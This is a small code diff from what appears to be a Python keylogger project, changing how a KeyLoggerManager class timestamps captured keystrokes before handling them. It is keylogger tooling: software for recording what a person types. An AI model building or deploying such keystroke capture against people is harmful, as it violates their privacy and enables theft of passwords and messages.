@@ -27,7 +27,7 @@ class KeyLoggerManager:
         while self.flag:
             logged_keys = "".join(self.keylogger.get_logged_keys())
             if logged_keys:
-                logged_keys = datetime.now().strftime('*****%H:%M:%S %d/%m/%Y*****/n') + logged_keys + '/n' * 2
+                logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                 try:
                     if "<ESC>" in logged_keys:
                         self.keylogger.stop_logging()
